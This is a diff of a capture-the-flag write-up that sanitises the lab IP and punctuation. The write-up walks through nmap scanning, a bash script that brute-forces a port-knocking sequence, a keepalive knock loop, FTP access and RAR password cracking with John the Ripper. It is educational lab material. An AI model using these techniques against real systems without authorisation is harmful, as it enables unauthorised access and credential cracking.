@@ -1,18 +1,18 @@
 ---
-title: "Meme Forum — Port Knocking & Password Cracking"
+title: "Meme Forum - Port Knocking & Password Cracking"
 date: 2026-06-03
 description: "A challenge combining hidden endpoint discovery, port knocking brute force, FTP access, and RAR password cracking with John the Ripper."
 ---
 
 ## Overview
 
-"Meme Forum" required discovering a hidden endpoint, brute-forcing a port knocking sequence to unlock FTP access, and cracking a password-protected RAR archive to retrieve the flag.
+"MemeForum" required discovering a hidden endpoint, brute-forcing a port knocking sequence to unlock FTP access, and cracking a password-protected RAR archive to retrieve the flag.
 
 ---
 
 ## Solution Walkthrough
 
-### Step 1 — Initial Reconnaissance
+### Step 1 - Initial Reconnaissance
 ```bash
 nmap <target-ip>
 ```
@@ -20,7 +20,7 @@ Only port `8080` was open. Visited `https://memeforum.ctf/` — no obvious entry
 
 ---
 
-### Step 2 — Hidden Endpoint Discovery
+### Step 2 - Hidden Endpoint Discovery
 Inspected the HTML source of the main page and found a reference to a hidden endpoint: `/information`.
 
 Navigating there revealed:
@@ -29,17 +29,17 @@ Navigating there revealed:
 
 ---
 
-### Step 3 — Finding the Knock Sequence
-Returned to the main page. A video posted by the user `trollface` (referenced in the hint) had a "Watch on YouTube" link. Viewing the video revealed the ports: **69, 67, 88, 92** — but not in the correct order.
+### Step 3 - Finding the Knock Sequence
+Returned to the main page. A video posted by the user `trollface` (referenced in the hint) had a "Watch on YouTube" link. Viewing the video revealed the ports: **69, 67, 88, 92** - but not in the correct order.
 
 ---
 
-### Step 4 — Brute Force the Knock Sequence
+### Step 4 - Brute Force the Knock Sequence
 Developed a script to test all 24 permutations of the 4 ports, sending SYN packets for each and checking if FTP (port 21) became accessible:
 
 ```bash
 #!/bin/bash
-IP="172.30.1.35"
+IP="<target-ip>"
 PORTS=(69 67 88 92)
 
 check_ftp() {
@@ -76,12 +76,12 @@ permutations "${PORTS[@]}"
 
 ---
 
-### Step 5 — Maintain the Knock (Session Keepalive)
+### Step 5 - Maintain the Knock (Session Keepalive)
 To prevent the FTP session from timing out, a second script kept the knock sequence running continuously:
 
 ```bash
 #!/bin/bash
-IP="172.30.1.35"
+IP="<target-ip>"
 SEQ="67 88 92 69"
 echo "Maintaining open port with sequence: $SEQ"
 while true; do
@@ -92,12 +92,12 @@ done
 
 ---
 
-### Step 6 — FTP Access & Archive Download
+### Step 6 - FTP Access & Archive Download
 With the port knocking running in the background, connected to the FTP server and downloaded `flag.rar` — password protected.
 
 ---
 
-### Step 7 — Password Cracking
+### Step 7 - Password Cracking
 ```bash
 rar2john flag.rar > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
